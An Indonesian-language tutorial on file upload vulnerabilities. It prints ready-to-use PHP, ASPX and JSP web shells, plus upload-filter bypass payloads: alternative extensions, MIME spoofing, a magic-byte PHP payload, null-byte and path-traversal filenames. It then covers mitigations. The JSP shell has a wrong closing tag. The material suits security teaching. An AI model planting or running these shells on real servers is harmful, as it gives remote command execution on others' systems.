# 📤 File Upload Vulnerabilities & Injection

## 1. Definisi
**File Upload Vulnerability** terjadi ketika aplikasi web mengizinkan pengguna untuk mengunggah berkas (*file*) ke server tanpa melakukan validasi yang memadai terhadap nama, tipe, ukuran, isi, atau ekstensi berkas tersebut. 

Kerentanan ini menjadi sangat kritis jika penyerang berhasil mengunggah berkas skrip yang dapat dieksekusi di server (seperti berkas PHP, ASPX, atau JSP yang bertindak sebagai *Web Shell*). Begitu berkas tersebut berhasil diakses melalui browser, penyerang dapat mengeksekusi perintah sistem operasi pada server secara jarak jauh (**Remote Code Execution - RCE**).

---

## 2. Contoh Web Shell Sederhana

Web shell adalah skrip mini yang menerima input perintah sistem melalui parameter HTTP dan menjalankannya di server.

* **PHP Web Shell (`shell.php`)**:
  ```php
  <?php
  if(isset($_GET['cmd'])) {
      echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
  }
  ?>
  ```
  *Cara akses*: `http://target.com/uploads/shell.php?cmd=whoami`

* **ASPX Web Shell (`shell.aspx`)** (untuk Windows IIS):
  ```aspx
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <script runat="server">
      protected void Page_Load(object sender, EventArgs e) {
          string cmd = Request.QueryString["cmd"];
          if (cmd != null) {
              ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
              psi.RedirectStandardOutput = true;
              psi.UseShellExecute = false;
              Process p = Process.Start(psi);
              Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
          }
      }
  </script>
  ```

* **JSP Web Shell (`shell.jsp`)** (untuk Java Tomcat):
  ```jsp
  <%@ page import="java.io.*" %>
  <%
      String cmd = request.getParameter("cmd");
      if (cmd != null) {
          Process p = Runtime.getRuntime().exec(cmd);
          OutputStream os = p.getOutputStream();
          InputStream in = p.getInputStream();
          DataInputStream dis = new DataInputStream(in);
          String disr = dis.readLine();
          while ( disr != null ) {
              out.println(disr);
              disr = dis.readLine();
          }
      }
  <%
  ```

---

## 3. Teknik Bypass Proteksi Upload (WAF / Filter)

Developer sering menerapkan filter untuk membatasi file yang boleh diunggah (biasanya hanya gambar seperti `.jpg` atau `.png`). Berikut beberapa cara melewati pembatasan tersebut:

### A. Bypass Ekstensi Menggunakan Alternatif Ekstensi (Blacklist Bypass)
Jika server memblokir ekstensi `.php` menggunakan *blacklist* (daftar larangan), coba gunakan ekstensi alternatif yang masih diproses oleh server web sebagai PHP:
* **Ekstensi PHP alternatif**: `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`, `.pht`
* **Ekstensi ASPX/ASP alternatif**: `.asp`, `.asa`, `.cer`, `.asax`
* **Ekstensi JSP alternatif**: `.jspx`, `.jsw`, `.jsv`, `.war`

### B. Double Extension Bypass
Beberapa parser membaca ekstensi dari karakter titik pertama atau terakhir:
* `shell.jpg.php`
* `shell.php.jpg` (jika konfigurasi Apache salah, ia mungkin mengeksekusinya sebagai PHP jika ditaruh di akhir regex).
* `shell.php.png`

### C. Bypass Filter Content-Type (MIME Type Spoofing)
Aplikasi memverifikasi jenis berkas berdasarkan header HTTP `Content-Type` yang dikirimkan oleh browser.
* **Trik Bypass**: Gunakan Burp Suite untuk menangkap request unggah, lalu ubah header `Content-Type` dari file PHP Anda:
  ```http
  -- Request Asli --
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: application/x-php

  -- Ubah Menjadi --
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/png
  ```

### D. Bypass Pemeriksaan Magic Bytes (File Signature)
Aplikasi membaca beberapa byte pertama dari isi berkas untuk menentukan jenis berkas asli, bukan hanya percaya pada ekstensi atau MIME type.
* **Trik Bypass**: Sisipkan tanda pengenal gambar (*Magic Bytes*) di baris paling atas isi berkas sebelum kode PHP Anda:
  * Untuk **GIF**: Masukkan `GIF89a;` di awal berkas.
  * Untuk **PNG**: Masukkan header byte PNG.
  * **Contoh Payload**:
    ```php
    GIF89a;
    <?php system($_GET['cmd']); ?>
    ```

### E. Null Byte Injection (Untuk Server Lama / PHP < 5.3.4)
Mengelabui validasi ekstensi di sisi server yang ditulis dalam bahasa C:
* `shell.php%00.png` atau `shell.php\x00.png`
* Sistem validasi membaca file berakhiran `.png` (lolos validasi), namun saat disimpan di sistem berkas lokal, nama file dipotong setelah null byte (`%00`) menjadi `shell.php`.

### F. Filename Path Traversal
Mencoba memaksa server menaruh file upload di direktori penting lain (seperti direktori root atau config) dengan memanipulasi parameter nama file:
* `filename="../../../../var/www/html/shell.php"`

---

## 4. Mitigasi (Pencegahan)

Mengamankan fitur unggah berkas harus dilakukan secara menyeluruh dan berlapis:

### ✔️ 1. Batasi Ekstensi Menggunakan Daftar Putih (Whitelisting - Wajib)
Jangan pernah menggunakan daftar larangan (*blacklist*). Selalu gunakan daftar izin (*whitelist*) yang sangat ketat untuk ekstensi yang diperbolehkan.
```php
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$file_ext = strtolower(pathinfo($_FILES['uploaded_file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_ext, $allowed_extensions)) {
    die("Format file tidak diizinkan!");
}
```

### ✔️ 2. Ubah Nama Berkas (Rename File)
Jangan pernah menyimpan berkas dengan nama asli yang diberikan oleh pengguna. Ubah nama berkas menjadi string acak (seperti UUID v4 atau hash MD5 + timestamp) untuk mencegah penyerang mengakses shell mereka secara langsung jika mereka berhasil mengunggahnya.
```php
$new_filename = uniqid() . '.' . $file_ext;
```

### ✔️ 3. Simpan File di Luar Root Dokumen Web (Web Root)
Simpan seluruh file hasil unggahan di direktori khusus yang berada di luar direktori publik server web (misalnya di luar `/var/www/html/`). Berkas hanya dapat diakses melalui skrip pembaca internal (seperti skrip PHP perantara yang menyajikan gambar) yang tidak mengeksekusi skrip tersebut.

### ✔️ 4. Nonaktifkan Eksekusi Skrip di Direktori Unggahan
Jika file terpaksa disimpan di dalam direktori publik web, konfigurasikan web server untuk **tidak mengeksekusi berkas skrip** di folder tersebut.

* **Konfigurasi Apache (`.htaccess` di folder upload)**:
  ```apache
  <Files *>
      ForceType application/octet-stream
      Header set Content-Disposition attachment
  </Files>
  <FilesMatch "\.(?i:jpe?g|gif|png)$">
      ForceType none
  </FilesMatch>
  RemoveHandler .php .phtml .php3 .php4 .php5 .pht
  RemoveType .php .phtml .php3 .php4 .php5 .pht
  php_flag engine off
  ```

* **Konfigurasi Nginx**:
  ```nginx
  location /uploads/ {
      location ~ \.(php|phtml|php3|php4|php5)$ {
          deny all;
      }
  }
  ```

---

## 5. Referensi Terpercaya
* [PortSwigger Web Security Academy: File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
* [OWASP Cheat Sheet Series: File Upload Prevention](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Prevention_Cheat_Sheet.html)
* [PayloadsAllTheThings: File Upload Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
